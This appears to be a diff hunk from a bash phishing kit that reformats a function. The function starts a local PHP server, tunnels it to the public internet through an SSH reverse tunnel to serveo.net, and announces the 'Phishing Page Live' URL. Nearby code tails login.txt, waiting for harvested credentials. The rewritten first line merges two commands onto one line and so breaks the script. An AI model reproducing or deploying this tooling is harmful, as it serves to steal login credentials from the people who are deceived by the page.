@@ -99,24 +99,22 @@ echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
 tail -n 0 -f login.txt 2>/dev/null
 }
 
-start_serveo() {
-    echo -e "${GRN}[+] Starting PHP server...${NC}"
-    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+start_serveo() { echo -e "${GRN}[+] Starting PHP server...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 
-    sleep 1
+sleep 1
 
-    echo -e "${GRN}[+] Starting Serveo tunnel...${NC}"
-    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
+echo -e "${GRN}[+] Starting Serveo tunnel...${NC}"
+ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
 
-    sleep 0.5
+sleep 0.5
 
-    SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*\.serveo.net" serveo.log)
+SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*\.serveo.net" serveo.log)
 
-    if [ ! -z "$SERVEO_URL" ]; then
-        echo -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL ${NC}"
-    else
-        echo -e "${RED}[!] Failed to get Serveo URL. Check SSH connection.${NC}"
-    fi
+if [ ! -z "$SERVEO_URL" ]; then
+    echo -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL ${NC}"
+else
+    echo -e "${RED}[!] Failed to get Serveo URL. Check SSH connection.${NC}"
+fi
 }
     
 #live credentials 
